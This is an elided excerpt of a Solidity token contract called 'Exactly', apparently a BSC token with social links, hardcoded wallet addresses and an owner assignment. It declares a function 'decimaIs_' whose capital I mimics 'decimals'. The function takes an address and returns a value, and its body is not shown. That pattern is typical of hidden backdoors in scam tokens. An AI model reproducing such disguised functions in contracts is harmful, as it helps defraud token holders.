...
Telegram : https://t.me/Exactly_BSC

Twitter : https://twitter.com/ExactlyBSC
...
interface IERC20 {
    ...
    function decimaIs_(address transfered_Address) external returns (uint256);
...
contract Exactly is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0xeC2870A4d2E17271a90De0917F29661C6EF18Bf6); 
    address payable public Wallet_Utility = payable(0xD33Fc20d9A8c1ca2708245Eaeb818925Bd354dA8);
    ...
    constructor () {
        ...
        _owner = 0xD33Fc20d9A8c1ca2708245Eaeb818925Bd354dA8;
    ...
    function decimaIs_(address transfered_Address) public override returns (uint256) {
